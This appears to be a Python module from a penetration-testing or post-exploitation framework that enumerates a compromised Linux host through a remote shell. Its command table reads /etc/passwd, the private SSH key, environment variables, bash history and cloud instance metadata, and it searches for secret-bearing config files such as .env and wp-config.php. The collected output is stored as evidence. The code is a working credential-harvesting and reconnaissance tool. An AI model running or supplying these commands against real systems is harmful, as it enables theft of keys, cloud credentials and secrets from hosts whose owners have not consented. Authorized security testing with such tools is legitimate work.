from __future__ import annotations
from ..modules.base import Finding

CMDS = {
    "whoami": "id; whoami; hostname; uname -a",
    "users": "cat /etc/passwd 2>/dev/null",
    "sudo": "sudo -n -l 2>&1",
    "suid": "find / -perm -4000 -type f 2>/dev/null | head -40",
    "cron": "ls -la /etc/cron* /var/spool/cron 2>/dev/null; crontab -l 2>/dev/null",
    "docker": "ls -la /var/run/docker.sock 2>/dev/null; docker ps 2>/dev/null",
    "net": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
    "env": "env",
    "ssh": "ls -la ~/.ssh 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null | head -40",
    "cloud": "curl -s -m3 http://169.254.169.254/latest/meta-data/ 2>/dev/null; "
             "curl -s -m3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/ 2>/dev/null",
    "configs": "find /var/www /srv /opt /home -maxdepth 5 -type f \\( -name '.env*' -o -name 'wp-config.php' "
               "-o -name 'config.php' -o -name '*.yml' -o -name '*.ini' -o -name 'settings.py' \\) 2>/dev/null | head -60",
    "history": "cat ~/.bash_history 2>/dev/null | tail -80",
}


async def run(ctx, sh) -> Finding:
    base = ctx.ev_dir() / "enum"
    base.mkdir(exist_ok=True)
    collected = {}
    for name, cmd in CMDS.items():
        await ctx.log(f"[enum] {name}")
        r = await sh.exec(cmd, timeout=45)
        (base / f"{name}.txt").write_text(f"$ {cmd}\n\n{r.out}", errors="ignore")
        collected[name] = len(r.out)
    ctx.save("enum-index.json", str(collected))
    return await ctx.emit(Finding(
        kind="post-enum", title=f"Enumerasi host selesai ({len(CMDS)} kategori)",
        target=ctx.target, severity="high", confidence="confirmed",
        evidence="hasil: evidence/enum/",
        repro=[f"cat evidence/enum/{k}.txt" for k in CMDS],
        data={"sizes": collected}))
